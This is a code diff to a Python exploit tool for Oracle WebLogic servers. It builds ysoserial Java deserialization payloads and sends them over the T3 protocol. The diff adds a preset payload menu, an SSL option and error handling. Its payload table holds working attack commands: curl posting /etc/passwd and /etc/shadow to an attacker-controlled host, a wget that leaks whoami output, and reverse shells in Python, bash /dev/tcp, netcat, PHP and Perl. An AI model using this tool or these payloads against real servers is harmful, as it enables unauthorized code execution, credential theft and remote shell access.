@@ -9,6 +9,7 @@ import sys
 import struct
 import subprocess
 import argparse
+import re
 
 # Check if we are running this on windows platform
 is_windows = sys.platform.startswith('win')
@@ -16,7 +17,6 @@ is_windows = sys.platform.startswith('win')
 
 # Console Colors
 if is_windows:
-    # Windows deserve coloring too :D
     G = '\033[92m'  # green
     Y = '\033[93m'  # yellow
     B = '\033[94m'  # blue
@@ -26,12 +26,9 @@ if is_windows:
         import win_unicode_console , colorama
         win_unicode_console.enable()
         colorama.init()
-        #Now the unicode will work ^_^
     except:
-        print("[!] Error: Coloring libraries not installed ,no coloring will be used [Check the readme]")
+        print("[!] Error: Coloring libraries not installed ,no coloring will be used")
         G = Y = B = R = W = G = Y = B = R = W = ''
-
-
 else:
     G = '\033[92m'  # green
     Y = '\033[93m'  # yellow
@@ -73,6 +70,7 @@ def ysoserial_info():
 def existing_payloads():
     print("""
     Available exploit payloads:
+                0-  Exit
                 1-  Attempt to retrieve /etc/passwd file
                 2-  Attempt to retrieve /etc/shadow file
                 3-  whoami
@@ -83,43 +81,43 @@ def existing_payloads():
                 8-  Attempt to get reverse shell (php) - Linux
                 9-  Attempt to get reverse shell (netcat) - Linux
                 10- Attempt to get reverse shell (perl) - Linux
-                Exit
     """)
 
 def use_existing_payloads(option, lhost=None, lport=None):
-    ## TODO: Add PHP, Netcat, Perl.
     switcher = {
-        0: "exit",
         1: "curl -i -X POST -F data=@/etc/passwd http://{0}:{1}".format(lhost,lport),
         2: "curl -i -X POST -F data=@/etc/shadow http://{0}:{1}".format(lhost,lport),
         3: "wget 'http://{0}:{1}/?$(whoami)'".format(lhost,lport),
-        4: '''python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}","{1}"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"'''.format(lhost,lport),
+        4: 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}","{1}"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);"'.format(lhost,lport),
         5: "/bin/bash -i > /dev/tcp/{0}/{1} 0>&1 2>&1".format(lhost,lport),
         6: "/bin/sh -i > /dev/tcp/{0}/{1} 0>&1 2>&1".format(lhost,lport),
         7: "nc -nv {0} {1} -e cmd.exe".format(lhost,lport),
-        8: '''php -r "$sock=fsockopen('{0}',{1});exec('/bin/sh -i <&3 >&3 2>&3');"'''.format(lhost,lport),
+        8: 'php -r "$sock=fsockopen(\'{0}\',{1});exec(\'/bin/sh -i <&3 >&3 2>&3\');"'.format(lhost,lport),
         9: "nc -e /bin/sh {0} {1}".format(lhost,lport),
-        10: """perl -e 'use Socket;$i="{0}";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""".format(lhost,lport)
+        10: 'perl -e \'use Socket;$i="{0}";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\''.format(lhost,lport)
     }
-    return switcher.get(option, 0)
+    return switcher.get(option, "99")
 
 def parser_onerror(errmsg):
     print("Usage: python " + sys.argv[0] + " [Options] use -h for help")
-    print(R + "Error: " + errmsg + W)
+    print(R + "[!]Error: " + errmsg + W)
     sys.exit()
 
 def menu():
     command = " "
     while (command != "exit"):
         option = raw_input("Choose one option: ")
+        if option == "0":
+            exit()
+        if option == "99":
+            print "Invalid option"
+            exit()
         return int(option)
-    print "Have fun!"
-
-
 
 def parse_args():
     # parse the arguments
-    parser = argparse.ArgumentParser(epilog='\tExample: \r\npython ' + sys.argv[0] + "-H HOST -P PORT -p PAYLOAD|OPTION -pt PAYLOAD_TYPE")
+    parser = argparse.ArgumentParser(epilog='\tExample: \r\npython ' + sys.argv[0] + " -H 127.0.0.1 -P 7001 -p 'uname -a' -pt CommonsCollections1"
+                                                                                     '\r\n\tpython ' + sys.argv[0] + " -H 127.0.0.1 -P 7001 -p 4\r\n")
     parser.error = parser_onerror
     parser._optionals.title = "OPTIONS"
     parser.add_argument('-ly', '--list_ysoserial', help="List available ysoserial payload types", action="store_true")
@@ -130,6 +128,7 @@ def parse_args():
     parser.add_argument('-P', '--port', help='Port where WebLogic is listening', default=7001)
     parser.add_argument('-LH', '--local_host', help='IP from the HOST', default=None)
     parser.add_argument('-LP', '--local_port', help='Port where WebLogic is listening', default=4444)
+    parser.add_argument('-ssl', '--ssl', help='Attempt to use SLL', action="store_true")
     return parser.parse_args()
 
 
@@ -144,6 +143,7 @@ if __name__ == "__main__":
     payload_list = args.list_payloads
     lhost = args.local_host
     lport = args.local_port
+    ssl = args.ssl
 
     # Printing Banner
     banner()
@@ -154,17 +154,40 @@ if __name__ == "__main__":
     if payload_list:
         existing_payloads()
         payload = use_existing_payloads(menu(), lhost, lport)
-    print "payload " + str(payload)
-    subprocess.call(['java', '-jar', 'ysoserial-master-v0.0.4-gad26e2b-61.jar', payload_type, payload], stdout=open('payload_file', 'wb'))
+
+    pattern = re.compile("^[0-9]+")
+    if pattern.match(payload):
+        payload = use_existing_payloads(int(payload), lhost, lport)
+    print "payload2", payload
+
+    if payload is not None:
+        subprocess.call(['java', '-jar', 'ysoserial-master-v0.0.4-gad26e2b-61.jar', payload_type, payload], stdout=open('payload_file', 'wb'))
+    else:
+        print "\r\n[!]Invalid Payload or Payload Type"
+        exit()
+
+    #print "[#]Payload chosen >> \r\n" + payload
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    server_address = (host, port)
-    print 'connecting to %s port %s' % server_address
-    sock.connect(server_address)
+    if host is not None and port is not None:
+        server_address = (host, port)
+        print 'connecting to %s port %s' % server_address
+        try:
+            sock.connect(server_address)
+        except:
+            print "\r\n[!]Couldn't connect to %s port %s" % server_address
+            exit()
+    else:
+        print '\r\n[!]Invalid host or port'
+        exit()
 
     # Send headers
-    headers='t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'
+    if ssl:
+        #Not checked yet
+        headers='t3s 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'
+    else:
+        headers = 't3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'
     print 'sending "%s"' % headers
     sock.sendall(headers)
 
